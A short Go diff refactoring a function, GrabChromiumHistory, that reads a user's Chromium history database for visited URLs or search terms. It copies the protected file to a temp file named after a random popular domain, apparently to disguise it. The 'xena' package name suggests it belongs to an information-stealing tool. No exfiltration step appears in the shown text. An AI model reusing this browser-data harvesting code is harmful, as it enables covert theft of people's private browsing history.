@@ -1,15 +1,16 @@
-package main
+package modules
 
 import (
 	"database/sql"
 	"errors"
 	"io"
 	"os"
+	"xena/helpers"
 )
 
-// grabChromiumHistory extracts Chromium's history and returns it as a slice of strings.
+// GrabChromiumHistory extracts Chromium's history and returns it as a slice of strings.
 // It can either return visited urls or search terms. Accpeted input is: 'VISITS', 'TERMS'.
-func grabChromiumHistory(desiredInformation string) ([]string, error) {
+func GrabChromiumHistory(desiredInformation string) ([]string, error) {
 	history := []string{}
 
 	// User's home folder.
@@ -33,7 +34,7 @@ func grabChromiumHistory(desiredInformation string) ([]string, error) {
 	defer dbFile.Close()
 
 	// Create a new temp folder, where we'll put the content of the db, since the original db file is protected.
-	tempFileName := randomPopularWord()
+	tempFileName := helpers.RandomPopularDomain()
 	tempFilePath := homeDir + "/.config/chromium/Default/" + tempFileName
 	tempFile, err := os.Create(tempFilePath)
 	if err != nil {
